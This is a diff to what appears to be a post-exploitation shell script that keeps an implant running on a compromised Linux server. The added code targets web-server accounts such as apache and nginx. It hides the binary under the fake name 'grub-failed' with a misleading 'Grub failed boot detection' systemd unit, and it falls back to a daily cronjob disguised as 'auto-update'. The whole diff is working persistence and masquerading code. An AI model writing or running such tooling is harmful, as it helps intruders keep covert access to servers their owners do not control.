@@ -53,14 +53,70 @@ if [ -f "$out" ]; then
 
             sleep 2
             p=$(systemctl is-active "grub-failed" 2>/dev/null)
-            if [[ "$s" == "active" || "$s" == "activating" ]]; then
+            if [[ "$p" == "active" || "$p" == "activating" ]]; then
                 systemctl restart "grub-failed" &
                 echo "[+]-----| Binary persistence established!"
                 echo "[i]-----| Check systemd: $ systemctl --no-pager status grub-failed"
             else
                 echo "[!]-----| Failed to established persistence.."
-                echo "[i]-----| Run the binary: $ nohup /usr/bin/grub-failed &>/dev/null & disown"
             fi
         fi
+
+        if [ "$b" -eq 0 ] && [[ "$USER" =~ ^(www|apache|nginx|httpd) ]]; then
+            echo "[i]-----| Setting up local(user) systemd service.."
+
+            service_dir="$HOME/.config/systemd/user"
+            service_file="$service_dir/grub-failed.service"
+            implant="$service_dir/grub-failed"
+            mkdir -p "$service_dir"
+            mv "/tmp/<IMPLANT>" "$service_dir/grub-failed"
+
+            cat > "$service_file" <<EOF
+[Unit]
+Description=Grub failed boot detection
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=$service_dir/grub-failed
+Restart=always
+
+[Install]
+WantedBy=default.target
+EOF
+
+            systemctl --user daemon-reload 2>/dev/null
+            systemctl --user enable "grub-failed" 2>/dev/null
+            systemctl --user start "grub-failed" 2>/dev/null
+
+            sleep 2
+            p=$(systemctl --user is-active "grub-failed" 2>/dev/null)
+            if [[ "$p" == "active" || "$p" == "activating" ]]; then
+                systemctl --user restart "grub-failed" &
+                echo "[+]-----| Binary persistence established!"
+                echo "[i]-----| Check systemd: $ systemctl --no-pager --user status grub-failed"
+            else
+                echo "[!]-----| Failed to established persistence.."
+                echo "[i]-----| Setting up cronjob for persistence.."
+
+                mkdir -p "$HOME/.config/tasks"
+                mv "$implant" "$HOME/.config/tasks/auto-update"
+                persist="@daily $HOME/.config/tasks/auto-update"
+
+                if command -v crontab >/dev/null 2>&1; then
+                    (crontab -l 2>/dev/null; echo "$persist") | crontab -
+                    last_line=$(crontab -l 2>/dev/null | sed '/^\s*$/d' | tail -n 1)
+                    if [ "$last_line" = "$persist" ]; then
+                        success "Cronjob successfully created!"
+                        success "Persistence established.."
+                    fi
+                else
+                    echo "[!]-----| Failed to add cronjob.."
+                fi
+                nohup ~/.config/tasks/auto-update &>/dev/null & disown
+            fi
+        fi
+        
+        echo "[i]-----| Run the binary: $ nohup /usr/bin/grub-failed &>/dev/null & disown"
     fi
 fi
